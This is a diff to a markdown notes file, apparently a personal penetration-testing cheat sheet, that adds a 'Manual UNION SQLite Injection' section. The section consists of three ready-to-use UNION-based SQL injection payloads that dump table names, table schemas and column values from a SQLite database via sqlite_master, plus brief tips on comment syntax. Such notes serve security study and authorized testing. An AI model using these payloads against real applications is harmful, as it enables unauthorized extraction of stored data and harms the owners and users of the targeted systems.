@@ -1,6 +1,20 @@
 # Notes
 
 
+### Manual UNION SQLite Injection
+*Table*
+```sql
+1' union all select 1,tbl_name,3 FROM sqlite_master WHERE type='table' limit 0,1 --
+```
+*Columns (as command)*
+```sql
+1' union all select 1,sql,3 FROM sqlite_master WHERE type='table' and tbl_name='nameoftable' limit 0,1 -- 
+```
+*Values (payload depends on the columns structure)*
+```sql
+1' union all select 1,"nameofcolumn",3 FROM "nameoftable" limit 2,1 --
+```
+
 ### SQL Injection Little Tips
 ```-- ``` -> Linux <br>
 ```--+``` -> Windows <br>
